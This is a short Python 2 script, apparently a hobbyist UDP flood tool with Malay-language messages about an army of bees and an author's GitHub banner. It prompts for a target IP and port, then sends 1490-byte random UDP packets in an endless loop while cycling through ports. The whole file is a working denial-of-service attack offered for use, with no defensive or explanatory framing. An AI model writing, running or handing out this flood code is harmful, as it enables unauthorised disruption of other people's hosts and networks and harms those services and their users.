import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet SENGATAN LEBAH")

print "HAK MILIK IMPERIAL ADMINISTRATOR"
print "Author   : Lebah-Gatal"
print "github   : https://github.com/Lebah-Gatal"
print "----------*No Sistem Is Safe*---------------"
print

ip = raw_input("Masukkan IP Target : ")
port = input  ("Masukkan Port      : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[menyediakan tentera lebah] 0% "
time.sleep(5)
print "[tentera lebah memakai sut perang] 25%"
time.sleep(5)
print "[lebah-lebah mengasah jarum] 50%"
time.sleep(5)
print "[meletakan racun di jarum] 75%"
time.sleep(5)
print "[pasukan lebah siap] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught Port"%(sent,ip)
     if port == 65534:
       port = 1
